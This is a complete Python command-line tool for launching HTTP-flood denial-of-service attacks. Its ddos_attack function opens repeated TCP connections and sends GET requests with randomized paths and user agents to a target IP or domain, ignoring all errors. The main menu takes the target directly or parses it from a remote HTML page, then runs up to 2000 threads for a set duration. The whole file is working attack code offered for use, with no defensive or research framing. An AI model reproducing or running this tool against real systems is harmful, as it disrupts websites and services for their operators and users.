import os
import time
import socket
import threading
import random
from urllib.parse import urlparse
from banner import show_banner
from termcolor import colored

def resolve_target(target):
    """Resolve domain name to IP address if needed"""
    try:
        # Check if target is an IP address or domain
        socket.inet_aton(target)
        return target  # It's already an IP address
    except socket.error:
        # It's a domain name, resolve to IP
        return socket.gethostbyname(target)

def ddos_attack(target, port, duration, thread_id, path=""):
    start_time = time.time()
    packet_count = 0
    
    # Resolve target to IP address
    ip = resolve_target(target)
    
    while time.time() - start_time < duration:
        try:
            # Use different socket types for variety
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)  # Faster timeout
            
            # Randomize the user agent to look like different browsers
            user_agents = ["Mozilla/5.0", "Chrome/91.0", "Firefox/89.0"]
            
            # Use the provided path or generate a random one
            request_path = path if path else f"/{random.randint(1, 1000)}"
            
            request = f"GET {request_path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(user_agents)}\r\nConnection: keep-alive\r\n\r\n"
            
            sock.connect((ip, port))
            sock.send(request.encode())
            sock.close()
            packet_count += 1
            
            if packet_count % 50 == 0:
                print(colored(f"[Thread-{thread_id}] Sent {packet_count} packets", 'green'), end='\r')
        except Exception as e:
            # Don't print errors, just keep trying
            pass
    
    print(colored(f"\n[Thread-{thread_id}] Completed! Total packets: {packet_count}", 'cyan'))

def get_target_from_html(html_url):
    """Extract IP and URL from HTML page"""
    try:
        import urllib.request
        response = urllib.request.urlopen(html_url)
        html_content = response.read().decode('utf-8')
        
        # Simple parsing to find IP and URL in the HTML
        # This assumes your HTML has specific elements with IDs
        ip_start = html_content.find('id="ip"') + html_content[html_content.find('id="ip"'):].find('value="') + 7
        ip_end = html_content.find('"', ip_start)
        ip = html_content[ip_start:ip_end]
        
        url_start = html_content.find('id="url"') + html_content[html_content.find('id="url"'):].find('value="') + 7
        url_end = html_content.find('"', url_start)
        url = html_content[url_start:url_end]
        
        return ip, url
    except Exception as e:
        print(colored(f"\n[-] Error extracting from HTML: {str(e)}", 'red', attrs=['bold']))
        return None, None

def main():
    show_banner()
    try:
        print(colored("\nChoose attack method:", 'yellow', attrs=['bold']))
        print(colored("1. Direct IP Address", 'cyan'))
        print(colored("2. From HTML Page", 'cyan'))
        print(colored("3. Direct Domain Name", 'cyan'))
        
        choice = input(colored("\nEnter your choice (1/2/3): ", 'yellow', attrs=['bold']))
        
        if choice == "1":
            # Direct IP Address
            target_ip = input(colored("Enter Target IP: ", 'yellow', attrs=['bold']))
            path = input(colored("Enter Target Path (default /): ", 'yellow', attrs=['bold']) or "/")
            target = target_ip
            
        elif choice == "2":
            # From HTML Page
            html_url = input(colored("Enter HTML Page URL (e.g., http://your-server/Test.html): ", 'yellow', attrs=['bold']))
            target_ip, target_path = get_target_from_html(html_url)
            
            if not target_ip or not target_path:
                print(colored("\n[-] Failed to extract target information from HTML", 'red', attrs=['bold']))
                return
                
            path = target_path
            target = target_ip
            print(colored(f"\n[+] Extracted IP: {target_ip}", 'green'))
            print(colored(f"[+] Extracted Path: {target_path}", 'green'))
            
        elif choice == "3":
            # Direct Domain Name
            domain = input(colored("Enter Target Domain (e.g., example.com): ", 'yellow', attrs=['bold']))
            path = input(colored("Enter Target Path (default /): ", 'yellow', attrs=['bold']) or "/")
            target = domain
            
        else:
            print(colored("\n[-] Invalid choice!", 'red', attrs=['bold']))
            return
            
        target_port = int(input(colored("Enter Target Port (default 80): ", 'yellow', attrs=['bold']) or "80"))
        duration = int(input(colored("Enter Attack Duration in seconds (default 300): ", 'yellow', attrs=['bold']) or "300"))
        threads = int(input(colored("Enter Number of Threads (default 2000): ", 'yellow', attrs=['bold']) or "2000"))
        
        print(colored(f"\n[+] Starting MASSIVE Attack on {target}:{target_port}{path}", 'red', attrs=['bold']))
        print(colored(f"[+] Duration: {duration} seconds", 'red', attrs=['bold']))
        print(colored(f"[+] Threads: {threads}", 'red', attrs=['bold']))
        print(colored("[+] Press Ctrl+C to Stop\n", 'yellow', attrs=['bold']))
        
        attack_threads = []
        for i in range(threads):
            thread = threading.Thread(target=ddos_attack, args=(target, target_port, duration, i+1, path))
            thread.start()
            attack_threads.append(thread)
            time.sleep(0.001)  # Very small delay
        
        for thread in attack_threads:
            thread.join()
        
        print(colored("\n[+] Attack Completed Successfully!", 'green', attrs=['bold']))
    except KeyboardInterrupt:
        print(colored("\n[-] Attack Stopped by User", 'yellow', attrs=['bold']))
    except ValueError:
        print(colored("\n[-] Invalid Input! Please enter correct values.", 'red', attrs=['bold']))
    except Exception as e:
        print(colored(f"\n[-] Error: {str(e)}", 'red', attrs=['bold']))

if __name__ == "__main__":
    main()
